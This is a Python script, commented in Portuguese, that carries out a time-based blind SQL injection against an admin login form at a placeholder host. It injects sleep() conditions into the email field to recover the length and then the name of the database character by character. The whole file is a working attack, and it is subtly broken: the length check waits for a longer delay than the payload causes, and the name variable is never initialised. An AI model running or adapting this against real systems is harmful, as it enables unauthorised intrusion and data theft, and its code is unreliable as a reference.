import requests, sys, time

url = "http://site.com/admin/login.php?action=login2"
payload = {"email": ""}
caracteres = ' !"#$%&()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~'
valor = ''
tamanho = 60

###### Descobrir o tamanho do nome do schema ######
for tamanho in range(1,50):
    
    payload["email"] = f"hacker@mail.com' or if(length(database())={tamanho}, sleep(2), 0) #"

    # Marcação do tempo da requisição e o tempo da resposta
    tempo_envio = time.time()
    r = requests.post(url, data=payload)
    tempo_resposta = time.time()
    
    if tempo_resposta - tempo_envio > 5:
        schema_tamanho = tamanho
        print(f"# Tamanho do nome do schema: {schema_tamanho} caracteres")

###### Descobrir o nome do schema ######
for i in range(1, schema_tamanho + 1):
    # Itera sobre a lista de caracteres
    for c in caracteres:
        # Payload que será enviado. Variável i contém a posição do caractere e variável c contém o caractere a ser testado
        payload["email"] = f"hacker@mail.com' or if(ascii(substring(database(),{i},1))={ord(c)}, sleep(5), 0) #"

        # Marcação do tempo da requisição e o tempo da resposta
        tempo_envio = time.time()
        r = requests.post(url, data=payload)
        tempo_resposta = time.time()

        # Se o servidor demorar mais de 5 segundos para responder, marca o caractere
        if tempo_resposta - tempo_envio > 5:
            schema_nome += c
            print(f"# Nome do schema: ", end="")
            print(f"{schema_nome}")
            break   
